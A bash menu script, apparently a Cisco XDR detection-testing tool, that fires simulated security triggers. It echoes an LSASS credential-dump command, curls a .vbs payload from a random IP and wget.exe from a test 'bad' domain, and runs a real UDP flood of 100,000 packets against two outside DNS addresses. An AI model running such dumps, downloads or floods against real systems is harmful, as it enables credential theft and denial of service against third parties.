#!/bin/bash

# Function for "press any key" return to menu
pause() {
  read -n 1 -s -r -p "Press any key to return to the main menu..."
  echo
}

# Trigger 1: Fake LSASS dump emulation
edr_trigger() {
  echo "Simulating credential dump command..."
  echo "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID lsass.dmp full"
  echo "Command executed (simulated)."
}

# Trigger 2: Suspicious Invoke-WebRequest equivalent
nvm_trigger() {
  OUTFILE="suspicious_download.img"
  echo "Downloading file to $OUTFILE ..."
  curl --max-time 30 -s -o "$OUTFILE" \
    "https://www.cisco.com/content/dam/cisco-cdc/site/images/heroes/homepage/2025/nvidia-cisco-ai-2400x1028.jpg"
  echo "File downloaded (simulated suspicious file)."
  rm -f "$OUTFILE"
  echo "File removed."
}

# Trigger 3: DNS Abuse Emulation with Progress
ndr_trigger() {
  echo "Starting DNS abuse emulation. Please wait..."
  for target in 75.75.75.75 64.102.6.247; do
    echo "Target: $target"
    total=100000
    step=$((total / 100))   # 100 steps for percent

    for ((i=1; i<=total; i++)); do
      # Send 1200 zero bytes UDP packet using nc
      dd if=/dev/zero bs=1200 count=1 2>/dev/null | nc -u -w1 "$target" 53

      if (( i % step == 0 )); then
        percent=$(( i / step ))
        echo -ne "Progress: ${percent}%\r"
      fi
    done

    echo -e "Progress: 100%"
    echo "Completed flood cycle against $target"
    echo "Waiting 30 seconds between pings"
    sleep 30
  done
  echo "DNS abuse emulation complete."
}



# Trigger 4: Firewall Test Emulation
firewall_trigger() {
  RAND_IP=$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))
  URL="http://$RAND_IP/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/sqlite3.pdf.vbs"
  echo "Curling suspicious file from $URL ..."
  curl --max-time 30 -s "$URL" -o tempfile.vbs || true
  rm -f tempfile.vbs
  echo "Firewall trigger executed (simulated)."
}

# Trigger 5: Run All 4 in sequence, NO pauses in between
all_triggers() {
  echo "Running all triggers in sequence..."
  edr_trigger
  nvm_trigger
  ndr_trigger
  firewall_trigger
  echo "All 4 triggers executed successfully."
}

# Trigger 6: Umbrella Suspicious Download
umbrella_trigger() {
  echo "Attempting suspicious download of wget.exe from internetbadguys.com ..."
  curl --max-time 30 -s -o /tmp/wget.exe "http://internetbadguys.com/wget.exe" || true
  rm -f /tmp/wget.exe
  echo "Simulated Umbrella trigger complete."
}

# Main menu loop
while true; do
  clear
  echo "XX     XX  DDDDD   RRRRR"
  echo " XX   XX   DD  DD  RR  RR"
  echo "  XX XX    DD   DD RR   RR"
  echo "   XXX     DD   DD RRRRR"
  echo "  XX XX    DD   DD RR  RR"
  echo " XX   XX   DD  DD  RR   RR"
  echo "XX     XX  DDDDD   RR    RR"
  echo
  echo
  echo For details or assistance with this script, 
  echo contact Darryl Hicks - darhicks@cisco.com
  echo
  echo "Choose an option:"
  echo "1) EDR trigger"
  echo "2) NVM trigger"
  echo "3) NDR trigger"
  echo "4) Firewall trigger"
  echo "5) ALL 4 TRIGGERS"
  echo "6) Umbrella Trigger"
  echo
  echo "Enter your choice (1-6):"

  read choice
  case $choice in
    1) edr_trigger; pause ;;
    2) nvm_trigger; pause ;;
    3) ndr_trigger; pause ;;
    4) firewall_trigger; pause ;;
    5) all_triggers; pause ;;
    6) umbrella_trigger; pause ;;
    *) echo "Invalid choice. Try again."; sleep 2 ;;
  esac
done

